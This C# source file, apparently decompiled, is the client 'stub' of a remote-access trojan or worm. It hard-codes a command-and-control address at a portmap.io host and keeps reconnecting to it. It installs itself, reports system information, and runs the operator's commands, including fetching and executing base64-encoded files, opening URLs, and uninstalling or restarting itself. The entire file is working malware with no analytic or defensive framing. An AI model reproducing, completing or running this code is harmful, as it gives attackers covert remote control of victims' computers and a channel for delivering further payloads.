using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic;

namespace Stub;

internal class Program
{
	private static string mutex = "mHHxTTJ5ssiEE0";

	private static readonly Mutex singleton = new Mutex(initiallyOwned: true, mutex);

	private static string port = "21664";

	private static string ip = "D3VIL1337-21664.portmap.io";

	private const string SPL = "<#!#>";

	private static TcpClient wormSocket;

	private static MemoryStream wormMemoryStream;

	private static byte[] wormBuffer = new byte[1];

	private static bool wormIsConnected = false;

	private static Timer Tick = null;

	private static bool HeaderReceived = false;

	private static int botBufferSize = 1;

	private static readonly object LockSend = new object();

	private static readonly object lockread = new object();

	private static void Main()
	{
		if (mutex != "" && !mutex.Contains("gobrr") && !singleton.WaitOne(TimeSpan.Zero, exitContext: true))
		{
			Console.WriteLine("\nMutex USED.");
			Environment.Exit(-1);
		}
		new Thread(SocketReceive).Start();
		if (!Helper.inN.Contains("install") && !Helper.inN.Contains("Name"))
		{
			Helper.Install();
		}
	}

	private static void Ping(object obj)
	{
		Send("pongPing");
		GC.Collect();
		GC.WaitForPendingFinalizers();
		GC.Collect();
	}

	private static void SocketReceive()
	{
		while (true)
		{
			if (wormIsConnected)
			{
				try
				{
					while (!HeaderReceived)
					{
						if (wormSocket.Client.Receive(wormBuffer, 0, botBufferSize, SocketFlags.None) > 0)
						{
							wormMemoryStream.Write(wormBuffer, 0, wormBuffer.Length);
							if (wormBuffer[0] == 0)
							{
								botBufferSize = Convert.ToInt32(Encoding.UTF8.GetString(wormMemoryStream.ToArray()).Replace(Strings.ChrW(0).ToString(), ""));
								HeaderReceived = true;
								wormMemoryStream.Dispose();
								if (botBufferSize > 0)
								{
									wormBuffer = new byte[botBufferSize];
									HeaderReceived = true;
								}
								else
								{
									botBufferSize = 0;
									wormBuffer = new byte[4];
								}
							}
							continue;
						}
						wormIsConnected = false;
						break;
					}
					wormMemoryStream = new MemoryStream();
					if (botBufferSize <= 0)
					{
						continue;
					}
					wormBuffer = new byte[botBufferSize];
					while (wormMemoryStream.Length != botBufferSize)
					{
						int num = wormSocket.Client.Receive(wormBuffer, 0, wormBuffer.Length, SocketFlags.None);
						if (num != 0)
						{
							wormMemoryStream.Write(wormBuffer, 0, num);
							continue;
						}
						wormIsConnected = false;
						break;
					}
					ReadMessages(wormMemoryStream.ToArray());
					wormMemoryStream.Dispose();
					wormMemoryStream = new MemoryStream();
					wormBuffer = new byte[8];
					botBufferSize = 1;
					HeaderReceived = false;
				}
				catch (Exception)
				{
					wormIsConnected = false;
					goto IL_029c;
				}
				continue;
			}
			goto IL_029c;
			IL_029c:
			while (!wormIsConnected)
			{
				try
				{
					Thread.Sleep(new Random().Next(1000, 5000));
					try
					{
						if (Tick != null)
						{
							Tick.Dispose();
						}
						if (wormSocket != null)
						{
							wormSocket.Client.Close();
							wormSocket.Client.Dispose();
						}
					}
					catch
					{
					}
					wormIsConnected = false;
					wormSocket = new TcpClient();
					try
					{
						wormSocket.Connect(ip, Convert.ToInt32(port));
					}
					catch
					{
					}
					wormIsConnected = true;
					wormMemoryStream = new MemoryStream();
					wormBuffer = new byte[8];
					if (wormSocket.Client.Connected)
					{
						Info();
					}
					else
					{
						Console.WriteLine("Not connected");
					}
					Tick = new Timer(Ping, null, new Random().Next(10000, 120000), new Random().Next(10000, 120000));
				}
				catch
				{
				}
			}
		}
	}

	private static void Send(string text)
	{
		lock (LockSend)
		{
			try
			{
				if (!wormSocket.Connected)
				{
					wormIsConnected = false;
					return;
				}
				byte[] bytes = Encoding.UTF8.GetBytes(text.ToString());
				byte[] bytes2 = Encoding.UTF8.GetBytes(bytes.Length.ToString());
				wormSocket.Client.Poll(-1, SelectMode.SelectWrite);
				wormSocket.Client.Send(bytes2, 0, bytes2.Length, SocketFlags.None);
				wormSocket.Client.Send(Encoding.UTF8.GetBytes(Strings.ChrW(0).ToString()), 0, Encoding.UTF8.GetBytes(Strings.ChrW(0).ToString()).Length, SocketFlags.None);
				wormSocket.Client.Send(bytes, 0, bytes.Length, SocketFlags.None);
			}
			catch
			{
				wormIsConnected = false;
			}
		}
	}

	private static void Info()
	{
		Send(Helper.Info().ToString());
	}

	private static void ReadMessages(object msg)
	{
		lock (lockread)
		{
			try
			{
				string[] data = Encoding.UTF8.GetString((byte[])msg).Split(new string[1] { "<#!#>" }, StringSplitOptions.None);
				Task.Run(delegate
				{
					//IL_0118: Unknown result type (might be due to invalid IL or missing references)
					switch (data[0])
					{
					case "uns":
						Helper.Uninstall();
						break;
					case "site":
						Process.Start(data[1]);
						break;
					case "res":
						Helper.Restart();
						break;
					case "exit":
						Environment.Exit(0);
						break;
					case "file":
						Helper.Run(Convert.FromBase64String(data[2]), data[3], data[1]);
						Send("recv");
						break;
					case "Pong":
						break;
					case "msg":
						MessageBox.Show(data[1]);
						break;
					}
				});
			}
			catch
			{
			}
		}
	}
}
